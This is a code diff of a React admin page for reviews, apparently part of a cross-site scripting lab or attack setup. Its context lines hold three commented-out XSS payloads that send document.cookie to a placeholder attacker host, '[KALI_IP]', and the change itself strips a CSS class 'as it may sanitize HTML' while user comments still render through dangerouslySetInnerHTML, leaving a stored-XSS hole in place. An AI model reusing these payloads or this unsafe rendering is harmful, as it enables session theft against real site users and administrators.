@@ -313,8 +313,9 @@ export default function AdminReviews() {
                       {/* <img src=x onerror="new Image().src='http://[KALI_IP]/log?c='+document.cookie"> */}
                       {/* <svg onload="new Image().src='http://[KALI_IP]/log?c='+document.cookie"> */}
                       {/* <iframe src="javascript:new Image().src='http://[KALI_IP]/log?c='+document.cookie"></iframe> */}
+                      {/* Removed 'prose' class as it may sanitize HTML */}
                       <div 
-                        className="prose max-w-none text-sm text-gray-800 whitespace-pre-wrap"
+                        className="text-sm text-gray-800"
                         dangerouslySetInnerHTML={{ __html: review.comment }}
                       />
                     </div>
